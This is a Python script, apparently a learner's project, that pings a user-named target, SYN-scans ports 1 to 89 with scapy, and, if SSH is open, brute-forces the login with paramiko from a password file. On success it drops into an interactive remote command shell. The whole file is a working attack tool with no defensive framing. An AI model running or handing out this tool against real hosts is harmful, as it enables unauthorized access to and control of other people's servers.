from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko

# COLORS DEFINITION:
REGULAR = "\033[39m"
GREEN = "\033[92m"
ORANGE = "\033[93m"

# GLOBAL VARIABLES:
target = input(f"What is the target of your scan?\n {ORANGE}===> {REGULAR}")
registered_ports = range(1, 90)
open_ports = []

# FUNCTIONS:
def scanport(port_to_check):
    source_port = RandShort()
    conf.verb = 0
    pkt = sr1((IP(dst=target)/TCP(sport=source_port, dport=port_to_check, flags="S")), timeout=0.5, verbose=False)
    if pkt:
        if pkt.haslayer(TCP):
            #print(pkt.show())
            if pkt[TCP].flags == 0x12:
                #print("<=== ACK received ===>")
                sr(IP(dst=target)/TCP(sport=source_port, dport=port_to_check, flags="R"), timeout=2)
                return True
            else:
                #print("no ACK")
                return False
        else:
            #print("no TCP layer")
            return False
    else:
        #print("No response")
        return False

def checkavailable():
    try:
        conf.verb = 0
        icmp_pkt = sr1(IP(dst=target)/ICMP(), timeout=3)
    except Exception as error:
        print(error)
        return False
    if icmp_pkt:
        return True

def brute_force(port):
    password_list = []
    with open("PasswordList.txt") as file:
        passlist = file.read().splitlines()
        for line in passlist:
            password_list.append(line)
    user = input(f"What is the SSH username?\n{ORANGE} ===> {REGULAR}")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
            print(f"{ORANGE} ===> {GREEN}SSH successfully connected{REGULAR} with username: {ORANGE}{user}{REGULAR}, password: {ORANGE}{password}{REGULAR}")
            while True:
                cmd = input(f"{ORANGE} -> {REGULAR}")
                if cmd == "exit":
                    SSHconn.close()
                    return False
                stdin, stdout, stderr = SSHconn.exec_command(cmd)
                print(f"{ORANGE} -> {REGULAR}{stdout.read().decode()}{stderr.read().decode()}")
        except Exception as error:
            print(f"{password} " + str(error))
    return password_list

#brute_force(22)
#print("test passwordow")



# CHECKING TARGET AVAILABILITY
# MAIN FUNCTION:
if checkavailable():
    print(f" {ORANGE}===>{REGULAR} Your Target: {target} is {GREEN}available{REGULAR}!")
    for port in registered_ports:
        status = scanport(port)
        if status:
            open_ports.append(port)
            print(f"{ORANGE} ===>{REGULAR} Port {ORANGE}{port}{REGULAR} is {GREEN}open!{REGULAR}")
    print(f" {ORANGE}===>{REGULAR} Scan Finished!")
    if 22 in open_ports:
        while True:
            starter = input(f"{ORANGE} ===> {GREEN}Port 22 is open. Start brute-forcing?{REGULAR} (Y/N): ")
            if starter.upper() == "N":
                break
            elif starter.upper() == "Y":
                brute_force(22)
                break
            else:
                print(f"{ORANGE} ===> Type Y or N{REGULAR}")
#    print(f"Test kolorow: {GREEN}zielony{REGULAR}, {ORANGE}pomaranczowy{REGULAR} koniec testu")
    #print(open_ports)
else:
    print(f"{ORANGE} ===>{REGULAR} Your Target: {target} is {ORANGE}unavailable{REGULAR}!")






#checkavailable()
#scanport(8000)
